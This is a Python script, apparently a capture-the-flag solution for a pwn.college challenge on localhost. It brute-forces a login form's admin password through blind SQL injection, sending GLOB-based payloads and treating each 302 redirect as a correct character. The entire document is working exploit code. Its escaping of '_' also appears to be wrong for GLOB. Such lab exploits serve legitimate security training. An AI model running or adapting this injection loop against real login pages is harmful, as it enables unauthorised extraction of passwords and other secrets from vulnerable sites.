import string

import requests

URL = "http://challenge.localhost:80/"
USERNAME = "admin"

CHARSET = string.ascii_letters + string.digits + "_-."
flag = "pwn.college{"

print(f"[+] Starting brute force from prefix: {flag}")

while not flag.endswith("}"):
    found_char = False

    for char in CHARSET:
        # Escape SQL LIKE wildcards
        sql_char = f"\\{char}" if char in ["_", "%"] else char

        payload = f"test' OR password GLOB '{flag}{sql_char}*"
        data = {"username": USERNAME, "password": payload}

        # Disable redirects to catch the 302 status code directly
        response = requests.post(URL, data=data, allow_redirects=False)

        if response.status_code == 302:
            flag += char
            print(f"[+] Found character: {char}  |  Current flag: {flag}")
            found_char = True
            break

    if not found_char:
        # Check if closing brace completes the flag
        payload = f"test' OR password GLOB '{flag}}}*"
        data = {"username": USERNAME, "password": payload}

        if requests.post(URL, data=data, allow_redirects=False).status_code == 302:
            flag += "}"
            print("[+] Flag completed!")
            break
        else:
            print("[-] Next character not found in charset. Exiting.")
            break

print(f"\n[!] Final Flag: {flag}")
